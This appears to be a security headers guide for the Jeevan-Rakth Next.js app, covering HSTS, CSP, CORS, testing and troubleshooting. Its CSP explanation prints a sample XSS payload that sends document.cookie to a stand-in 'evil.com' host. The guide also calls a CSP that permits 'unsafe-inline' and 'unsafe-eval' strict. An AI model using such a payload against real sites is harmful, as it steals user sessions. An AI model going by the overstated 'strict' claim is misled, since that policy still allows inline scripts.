# Security Headers Implementation Guide

## 🔒 Overview

This document explains the comprehensive security headers implementation in the Jeevan-Rakth application. We've implemented industry-standard security headers to protect against common web vulnerabilities including XSS, MITM attacks, clickjacking, and unauthorized API access.

---

## 📋 Table of Contents

1. [Security Headers Implemented](#security-headers-implemented)
2. [Implementation Details](#implementation-details)
3. [CORS Configuration](#cors-configuration)
4. [Testing Your Security Headers](#testing-your-security-headers)
5. [Understanding Each Header](#understanding-each-header)
6. [Production Considerations](#production-considerations)
7. [Troubleshooting](#troubleshooting)

---

## 🛡️ Security Headers Implemented

### Summary Table

| Header | Purpose | Attack Prevention |
|--------|---------|-------------------|
| **HSTS** (HTTP Strict Transport Security) | Forces browsers to always use HTTPS | Man-in-the-middle (MITM) attacks, Protocol downgrade attacks |
| **CSP** (Content Security Policy) | Restricts allowed sources for scripts, styles, and content | Cross-Site Scripting (XSS), Data injection attacks |
| **CORS** (Cross-Origin Resource Sharing) | Controls which domains can access your API | Unauthorized cross-origin API access |
| **X-Frame-Options** | Prevents site from being embedded in iframes | Clickjacking attacks |
| **X-Content-Type-Options** | Prevents MIME-sniffing | MIME confusion attacks |
| **X-XSS-Protection** | Legacy XSS filter (backward compatibility) | Basic XSS attacks |
| **Referrer-Policy** | Controls referrer information sharing | Information leakage |
| **Permissions-Policy** | Disables unused browser features | Reduces attack surface |

---

## 🔧 Implementation Details

### 1. HSTS (HTTP Strict Transport Security)

**Configuration in `next.config.js`:**

```javascript
{
  key: 'Strict-Transport-Security',
  value: 'max-age=63072000; includeSubDomains; preload'
}
```

**Explanation:**
- `max-age=63072000` → Forces HTTPS for 2 years (730 days)
- `includeSubDomains` → Applies to all subdomains (e.g., api.yourdomain.com, www.yourdomain.com)
- `preload` → Eligible for browser HSTS preload list

**Why This Matters:**
- Prevents attackers from intercepting traffic even on first visit
- Once HSTS is cached, browsers refuse insecure HTTP connections
- Protects against SSL stripping attacks

**⚠️ Important:**
- Only enable HSTS when you're certain HTTPS is working correctly
- Once set, users cannot access your site via HTTP for 2 years
- Test thoroughly before enabling `preload`

---

### 2. Content Security Policy (CSP)

**Configuration in `next.config.js`:**

```javascript
{
  key: 'Content-Security-Policy',
  value: [
    "default-src 'self'",
    "script-src 'self' 'unsafe-eval' 'unsafe-inline' https://apis.google.com https://cdn.jsdelivr.net",
    "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
    "font-src 'self' https://fonts.gstatic.com data:",
    "img-src 'self' data: blob: https:",
    "connect-src 'self' https://apis.google.com",
    "frame-src 'self' https://www.google.com",
    "object-src 'none'",
    "base-uri 'self'",
    "form-action 'self'",
    "frame-ancestors 'none'",
    "upgrade-insecure-requests",
  ].join('; ')
}
```

**Directive Explanations:**

- **`default-src 'self'`** → Only allow resources from same origin by default
- **`script-src`** → Define allowed script sources
  - `'self'` → Scripts from same origin
  - `'unsafe-eval'` → Allow eval() (required for some frameworks)
  - `'unsafe-inline'` → Allow inline scripts (use cautiously)
  - External sources: Google APIs, CDNs
- **`style-src`** → Allowed stylesheet sources
  - Includes Google Fonts
  - `'unsafe-inline'` for inline styles (Tailwind CSS requirement)
- **`img-src`** → Allowed image sources
  - `data:` → Base64 encoded images
  - `blob:` → Blob URLs
  - `https:` → All HTTPS images
- **`connect-src`** → Allowed fetch/XHR/WebSocket destinations
- **`frame-src`** → Allowed iframe sources
- **`object-src 'none'`** → Block all plugins (Flash, etc.)
- **`upgrade-insecure-requests`** → Automatically upgrade HTTP to HTTPS

**Impact on Third-Party Integrations:**

⚠️ **Analytics Services** (Google Analytics, Mixpanel, etc.):
```javascript
// Add to script-src and connect-src:
"script-src 'self' https://www.google-analytics.com",
"connect-src 'self' https://www.google-analytics.com",
```

⚠️ **Payment Gateways** (Stripe, PayPal):
```javascript
"script-src 'self' https://js.stripe.com",
"connect-src 'self' https://api.stripe.com",
"frame-src 'self' https://js.stripe.com",
```

⚠️ **CDNs** (for libraries):
```javascript
"script-src 'self' https://cdn.jsdelivr.net https://unpkg.com",
```

---

### 3. CORS (Cross-Origin Resource Sharing)

**Configuration in `src/lib/securityHeaders.ts`:**

```typescript
export const corsConfig = {
  allowedOrigins: [
    'http://localhost:3000',
    'http://localhost:3001',
    process.env.NEXT_PUBLIC_APP_URL || 'http://localhost:3000',
    // Add production domains:
    // 'https://jeevan-rakth.com',
    // 'https://www.jeevan-rakth.com'
  ],
  allowedMethods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With'],
  credentials: true,
  maxAge: 86400, // 24 hours
};
```

**How It Works:**

1. **Preflight Requests** (OPTIONS):
   - Browser sends OPTIONS request before actual request
   - Server responds with allowed origins, methods, headers
   - Cached for 24 hours (maxAge)

2. **Actual Requests**:
   - Server validates origin against allowedOrigins
   - Adds CORS headers to response
   - Browser allows or blocks based on headers

**Middleware Implementation:**

```typescript
// In src/middleware.ts
import { handleCorsPreflightRequest, applyCorsHeaders } from "@/lib/securityHeaders";

export function middleware(req: NextRequest) {
  const origin = req.headers.get('origin');

  // Handle preflight
  if (req.method === 'OPTIONS' && pathname.startsWith('/api')) {
    return handleCorsPreflightRequest(origin || undefined);
  }

  // Apply CORS to responses
  if (pathname.startsWith('/api')) {
    const response = NextResponse.next();
    return applyCorsHeaders(response, origin || undefined);
  }
}
```

**⚠️ Production Security:**

**NEVER do this in production:**
```javascript
// ❌ BAD - Allows any domain
res.setHeader('Access-Control-Allow-Origin', '*');
```

**Always do this:**
```javascript
// ✅ GOOD - Specific allowed origins
const allowedOrigins = ['https://yourdomain.com'];
if (allowedOrigins.includes(origin)) {
  res.setHeader('Access-Control-Allow-Origin', origin);
}
```

---

### 4. Additional Security Headers

#### X-Frame-Options
```javascript
{
  key: 'X-Frame-Options',
  value: 'SAMEORIGIN'
}
```
- **DENY** → Cannot be framed at all
- **SAMEORIGIN** → Can only be framed by same origin
- **ALLOW-FROM** → Deprecated, use CSP frame-ancestors instead

#### X-Content-Type-Options
```javascript
{
  key: 'X-Content-Type-Options',
  value: 'nosniff'
}
```
Prevents browsers from MIME-sniffing (interpreting files as different type than declared).

#### Referrer-Policy
```javascript
{
  key: 'Referrer-Policy',
  value: 'strict-origin-when-cross-origin'
}
```
- Sends full URL for same-origin requests
- Sends only origin for cross-origin requests
- Protects user privacy

#### Permissions-Policy
```javascript
{
  key: 'Permissions-Policy',
  value: 'camera=(), microphone=(), geolocation=()'
}
```
Disables browser features you don't need. Reduces attack surface.

---

## 🧪 Testing Your Security Headers

### Method 1: Browser DevTools (Local Testing)

1. **Start your application:**
   ```bash
   npm run dev
   # or
   npm run build && npm start
   ```

2. **Open Chrome DevTools:**
   - Press `F12` or `Ctrl+Shift+I` (Windows/Linux) or `Cmd+Option+I` (Mac)
   - Go to **Network** tab
   - Visit your app: `http://localhost:3000`
   - Click on any request (e.g., the document request)
   - Go to **Headers** tab → **Response Headers**

3. **Verify these headers are present:**
   - ✅ `Strict-Transport-Security`
   - ✅ `Content-Security-Policy`
   - ✅ `X-Frame-Options`
   - ✅ `X-Content-Type-Options`
   - ✅ `Referrer-Policy`
   - ✅ `Permissions-Policy`

4. **For API routes, check CORS headers:**
   - Make an API request (e.g., `/api/users`)
   - Check for:
     - ✅ `Access-Control-Allow-Origin`
     - ✅ `Access-Control-Allow-Methods`
     - ✅ `Access-Control-Allow-Headers`

### Method 2: Online Security Scanners

#### 🔍 SecurityHeaders.com
```
https://securityheaders.com
```
1. Deploy your app to a public URL
2. Enter your URL on securityheaders.com
3. Get a grade (A+ is best)
4. See detailed report with recommendations

**Example Report:**
```
Score: A+

✅ Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
✅ Content-Security-Policy: [your policy]
✅ X-Frame-Options: SAMEORIGIN
✅ X-Content-Type-Options: nosniff
⚠️ Referrer-Policy: strict-origin-when-cross-origin
```

#### 🔍 Mozilla Observatory
```
https://observatory.mozilla.org
```
1. Enter your deployed URL
2. Click "Scan Me"
3. Get comprehensive security analysis
4. See scores for:
   - Content Security Policy
   - Cookies
   - Cross-origin Resource Sharing
   - HTTP Strict Transport Security
   - Redirection
   - Referrer Policy
   - Subresource Integrity
   - X-Content-Type-Options
   - X-Frame-Options

### Method 3: Command Line Testing (cURL)

```bash
# Test headers
curl -I https://your-deployed-app.com

# Test with specific origin (CORS)
curl -H "Origin: https://example.com" \
     -H "Access-Control-Request-Method: POST" \
     -H "Access-Control-Request-Headers: Content-Type" \
     -X OPTIONS \
     https://your-deployed-app.com/api/users
```

### Method 4: Automated Testing Script

Create a test file `scripts/test-security-headers.js`:

```javascript
const https = require('https');

const testUrl = process.env.TEST_URL || 'http://localhost:3000';

const requiredHeaders = [
  'strict-transport-security',
  'content-security-policy',
  'x-frame-options',
  'x-content-type-options',
  'referrer-policy',
  'permissions-policy'
];

https.get(testUrl, (res) => {
  console.log('🔍 Testing Security Headers\n');
  
  const missingHeaders = [];
  requiredHeaders.forEach(header => {
    const value = res.headers[header];
    if (value) {
      console.log(`✅ ${header}: ${value}`);
    } else {
      console.log(`❌ ${header}: MISSING`);
      missingHeaders.push(header);
    }
  });

  console.log('\n' + '='.repeat(50));
  if (missingHeaders.length === 0) {
    console.log('✅ All security headers present!');
  } else {
    console.log(`❌ Missing ${missingHeaders.length} headers`);
  }
}).on('error', (err) => {
  console.error('Error:', err);
});
```

Run it:
```bash
node scripts/test-security-headers.js
```

---

## 📸 Testing Screenshots Guide

### Screenshot 1: Chrome DevTools - Response Headers
![Response Headers Example]
1. Open DevTools (F12)
2. Network tab → Select main document
3. Headers tab → Response Headers section
4. Screenshot showing all security headers

### Screenshot 2: SecurityHeaders.com Scan Result
![SecurityHeaders Scan]
1. Visit https://securityheaders.com
2. Enter your deployed URL
3. View the grade and detailed report
4. Screenshot the summary and grade

### Screenshot 3: Mozilla Observatory Score
![Observatory Score]
1. Visit https://observatory.mozilla.org
2. Scan your deployed site
3. Screenshot the overall score and individual grades

### Screenshot 4: CORS Preflight Request
![CORS Preflight]
1. DevTools → Network tab
2. Filter: "OPTIONS"
3. Click on OPTIONS request
4. Show CORS headers in response

---

## 🤔 Understanding Security Headers in Depth

### Why HTTPS Enforcement Matters

**Scenario Without HSTS:**
```
User types: http://jeevan-rakth.com
   ↓
First request goes over HTTP (insecure)
   ↓
Attacker intercepts (MITM attack)
   ↓
User never reaches HTTPS site
```

**Scenario With HSTS:**
```
User types: http://jeevan-rakth.com
   ↓
Browser checks HSTS cache
   ↓
Automatically upgrades to HTTPS
   ↓
Connection encrypted from start
```

### How CSP Prevents XSS

**Without CSP:**
```javascript
// Attacker injects:
<script>
  // Steal user data
  fetch('https://evil.com/steal?data=' + document.cookie);
</script>

// Browser executes malicious script ❌
```

**With CSP:**
```javascript
// Attacker injects same script
<script>
  fetch('https://evil.com/steal?data=' + document.cookie);
</script>

// Browser blocks:
// ❌ "Refused to connect to 'https://evil.com' because it violates
//     the Content Security Policy directive: 'connect-src 'self''"
```

### CORS Request Flow

```
1. Browser makes request to API:
   GET https://api.yourdomain.com/users
   Origin: https://yourdomain.com

2. Server checks if origin is allowed:
   if (allowedOrigins.includes('https://yourdomain.com')) {
     → Set Access-Control-Allow-Origin: https://yourdomain.com
   }

3. Browser receives response:
   - If CORS headers match: ✅ Allow response
   - If CORS headers missing/wrong: ❌ Block response
```

---

## 🚀 Production Considerations

### Environment Variables

Create a `.env.production` file:

```bash
# Production URL
NEXT_PUBLIC_APP_URL=https://jeevan-rakth.com

# Enable strict security in production
NODE_ENV=production

# CORS allowed origins (comma-separated)
CORS_ALLOWED_ORIGINS=https://jeevan-rakth.com,https://www.jeevan-rakth.com
```

Update `src/lib/securityHeaders.ts`:

```typescript
export const corsConfig = {
  allowedOrigins: [
    // Development
    ...(process.env.NODE_ENV === 'development' 
      ? ['http://localhost:3000', 'http://localhost:3001'] 
      : []),
    // Production
    ...(process.env.CORS_ALLOWED_ORIGINS?.split(',') || []),
    process.env.NEXT_PUBLIC_APP_URL,
  ].filter(Boolean),
  // ... rest of config
};
```

### Pre-Deployment Checklist

- [ ] **HSTS**: Verify HTTPS is working correctly
- [ ] **CSP**: Test all third-party integrations still work
- [ ] **CORS**: Update allowedOrigins with production domains
- [ ] **Environment Variables**: Set production values
- [ ] **Testing**: Run security header scans on staging
- [ ] **Monitoring**: Set up alerts for security header failures
- [ ] **Documentation**: Update team on new security policies

### Deployment Platforms

#### Vercel
```javascript
// vercel.json
{
  "headers": [
    {
      "source": "/(.*)",
      "headers": [
        {
          "key": "Strict-Transport-Security",
          "value": "max-age=63072000; includeSubDomains; preload"
        }
      ]
    }
  ]
}
```

#### Netlify
```toml
# netlify.toml
[[headers]]
  for = "/*"
  [headers.values]
    Strict-Transport-Security = "max-age=63072000; includeSubDomains; preload"
    Content-Security-Policy = "default-src 'self'; ..."
```

#### AWS/Azure
Configure headers in your load balancer or reverse proxy (nginx/Apache).

---

## 🐛 Troubleshooting

### Common Issues and Solutions

#### Issue 1: CSP Blocking Inline Scripts
**Error:** `Refused to execute inline script because it violates CSP directive`

**Solution:**
```javascript
// Option 1: Use nonce for specific scripts
// In next.config.js, add nonce to CSP
"script-src 'self' 'nonce-{RANDOM}'"

// Option 2: Move inline scripts to external files
// Bad:
<script>console.log('inline')</script>

// Good:
// In public/scripts/app.js:
console.log('external');
// In HTML:
<script src="/scripts/app.js"></script>

// Option 3: Allow specific hash
// Generate hash and add to CSP
"script-src 'self' 'sha256-{HASH}'"
```

#### Issue 2: CORS Errors
**Error:** `Access to fetch has been blocked by CORS policy`

**Solutions:**
```javascript
// 1. Check origin is in allowedOrigins
console.log('Request origin:', req.headers.get('origin'));

// 2. Verify middleware is running
export const config = {
  matcher: ['/api/:path*'], // Make sure this matches your routes
};

// 3. Check for OPTIONS handler
if (req.method === 'OPTIONS') {
  return handleCorsPreflightRequest(origin);
}

// 4. Ensure credentials match
// Frontend:
fetch('/api/users', { credentials: 'include' });
// Backend:
corsConfig.credentials = true;
```

#### Issue 3: Third-Party Scripts Blocked
**Error:** `Refused to load script from 'https://cdn.example.com'`

**Solution:**
```javascript
// Add the domain to CSP
{
  key: 'Content-Security-Policy',
  value: "script-src 'self' https://cdn.example.com; ..."
}
```

#### Issue 4: Images Not Loading
**Error:** `Refused to load image because it violates CSP`

**Solution:**
```javascript
// Update img-src directive
"img-src 'self' data: https: blob:;"

// Or be more specific:
"img-src 'self' https://images.example.com https://cdn.example.com data:;"
```

#### Issue 5: HSTS Causing Issues During Development
**Problem:** Browser forcing HTTPS when you need HTTP

**Solution:**
```javascript
// Disable HSTS in development
const nextConfig = {
  async headers() {
    if (process.env.NODE_ENV === 'development') {
      return []; // No security headers in dev
    }
    return [/* production headers */];
  },
};

// Or clear HSTS in Chrome:
// chrome://net-internals/#hsts
// Enter domain → Delete
```

---

## 📚 Additional Resources

### Official Documentation
- [MDN: HTTP Headers](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers)
- [OWASP Security Headers](https://owasp.org/www-project-secure-headers/)
- [Next.js Security Headers](https://nextjs.org/docs/advanced-features/security-headers)

### Security Testing Tools
- [SecurityHeaders.com](https://securityheaders.com)
- [Mozilla Observatory](https://observatory.mozilla.org)
- [SSL Labs](https://www.ssllabs.com/ssltest/)
- [HSTS Preload](https://hstspreload.org/)

### Learning Resources
- [Content Security Policy Guide](https://content-security-policy.com/)
- [CORS Tutorial](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)

---

## 🎯 Reflection and Best Practices

### Balancing Security and Flexibility

**The Challenge:**
Implementing strict security headers can break functionality. The key is finding the right balance.

**Our Approach:**

1. **Start Permissive, Then Restrict:**
   ```javascript
   // Phase 1: Permissive (development)
   "script-src 'self' 'unsafe-inline' 'unsafe-eval' https:;"
   
   // Phase 2: Identify required sources
   "script-src 'self' 'unsafe-inline' https://apis.google.com;"
   
   // Phase 3: Remove unsafe directives (production goal)
   "script-src 'self' https://apis.google.com;"
   ```

2. **Use CSP Report-Only Mode:**
   ```javascript
   // Test without breaking
   {
     key: 'Content-Security-Policy-Report-Only',
     value: "default-src 'self'; report-uri /api/csp-report"
   }
   ```

3. **Document Exceptions:**
   ```javascript
   // Why we allow unsafe-inline for styles:
   // - Tailwind CSS generates inline styles
   // - Required for dynamic theming
   // - Plan to migrate to CSS modules in v2.0
   "style-src 'self' 'unsafe-inline';"
   ```

### Impact on Third-Party Integrations

**Analytics (Google Analytics, Mixpanel):**
- ✅ Easy to integrate - just add domains to CSP
- ⚠️ May require multiple directives (script-src, img-src, connect-src)
- 📝 Document in CSP configuration

**Payment Gateways (Stripe, PayPal):**
- ✅ Well-documented CSP requirements
- ⚠️ Often require frame-src for embedded forms
- 🔒 High security standards - compatible with strict CSP

**Social Media Embeds (Twitter, YouTube):**
- ⚠️ May require relaxed CSP
- 💡 Consider using facade/placeholder approach
- 📦 Load on user interaction to minimize CSP scope

**CDNs (for libraries):**
- ✅ Easy to whitelist specific CDNs
- 💡 Consider using Subresource Integrity (SRI)
  ```html
  <script src="https://cdn.example.com/lib.js" 
          integrity="sha384-{HASH}"
          crossorigin="anonymous"></script>
  ```

### Security vs. Performance Trade-offs

**HSTS Preloading:**
- ✅ Security: Maximum protection from day one
- ⚠️ Commitment: Cannot easily roll back
- 💡 Best practice: Test on staging first

**CSP:**
- ✅ Security: Prevents entire classes of attacks
- ⚠️ Performance: May break lazy-loaded scripts
- 💡 Best practice: Use nonces for dynamic content

**CORS Preflight Caching:**
- ✅ Performance: Reduces OPTIONS requests
- ⚠️ Security: Longer cache = slower security updates
- 💡 Best practice: 24-hour maxAge is good balance

---

## 📝 Summary

### What We've Implemented

✅ **HSTS**: Forces HTTPS for 2 years, includes subdomains, preload-ready  
✅ **CSP**: Prevents XSS with strict content source policies  
✅ **CORS**: Restricts API access to allowed origins only  
✅ **X-Frame-Options**: Prevents clickjacking  
✅ **X-Content-Type-Options**: Prevents MIME-sniffing  
✅ **Additional Headers**: Referrer-Policy, Permissions-Policy, X-XSS-Protection  

### Files Modified/Created

1. **`next.config.js`** - Global security headers
2. **`src/lib/securityHeaders.ts`** - Centralized security configuration
3. **`src/lib/corsMiddleware.ts`** - CORS helper utilities
4. **`src/middleware.ts`** - Enhanced with CORS support
5. **`SECURITY_HEADERS.md`** - This documentation

### Testing Checklist

- [ ] Run `npm run dev` and check headers in DevTools
- [ ] Test API endpoints with different origins
- [ ] Verify OPTIONS (preflight) requests work
- [ ] Deploy to staging and scan with securityheaders.com
- [ ] Check Mozilla Observatory score
- [ ] Test all third-party integrations still work
- [ ] Document any CSP violations and resolve them

### Next Steps

1. **Production Deployment:**
   - Update CORS allowed origins with production domain
   - Test HTTPS configuration
   - Enable HSTS preload after confirming stability

2. **Monitoring:**
   - Set up CSP violation reporting
   - Monitor for security header compliance
   - Regular security audits

3. **Continuous Improvement:**
   - Remove `'unsafe-inline'` where possible
   - Implement nonces for dynamic scripts
   - Add Subresource Integrity (SRI) for CDN resources
   - Consider implementing Certificate Transparency

---

## ✅ Implementation Complete

Your application now has enterprise-grade security headers protecting against:
- ❌ XSS attacks
- ❌ Clickjacking
- ❌ MITM attacks
- ❌ Unauthorized API access
- ❌ Data injection
- ❌ Protocol downgrade attacks

**Grade Target:** A+ on SecurityHeaders.com  
**Security Posture:** Production-ready

---

*Last Updated: December 31, 2025*  
*Document Version: 1.0*  
*Jeevan-Rakth Security Team*
